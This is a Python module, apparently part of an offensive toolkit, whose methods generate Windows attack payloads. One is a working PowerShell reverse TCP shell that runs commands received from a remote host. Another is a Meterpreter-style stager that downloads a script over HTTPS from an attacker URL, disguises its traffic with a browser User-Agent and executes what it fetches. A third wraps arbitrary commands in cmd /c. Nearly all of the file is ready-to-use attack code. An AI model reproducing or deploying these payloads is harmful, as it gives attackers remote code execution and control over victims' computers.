#!/usr/bin/env python3
"""
Windows Payload Modules
"""

class WindowsPayloads:
    def reverse_tcp(self, lhost, lport, options=None):
        """Windows Reverse TCP Shell"""
        if options is None:
            options = {}
        
        payload = f"""
$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}}
$client.Close();
"""
        return payload
    
    def meterpreter_reverse_https(self, lhost, lport, options=None):
        """Meterpreter-like Reverse HTTPS"""
        if options is None:
            options = {}
        
        payload = f"""
$LHOST = "{lhost}"
$LPORT = {lport}
$URL = "https://$LHOST`:$LPORT/api/v1/checkin"

function Invoke-Meterpreter {{
    try {{
        $client = New-Object System.Net.WebClient
        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        $script = $client.DownloadString($URL)
        Invoke-Expression $script
    }}
    catch {{
        Start-Sleep -Seconds 60
        Invoke-Meterpreter
    }}
}}

Invoke-Meterpreter
"""
        return payload
    
    def exec_cmd(self, lhost, lport, options=None):
        """Execute command payload"""
        if options is None:
            options = {}
        
        command = options.get('command', 'whoami')
        payload = f"cmd /c {command}"
        return payload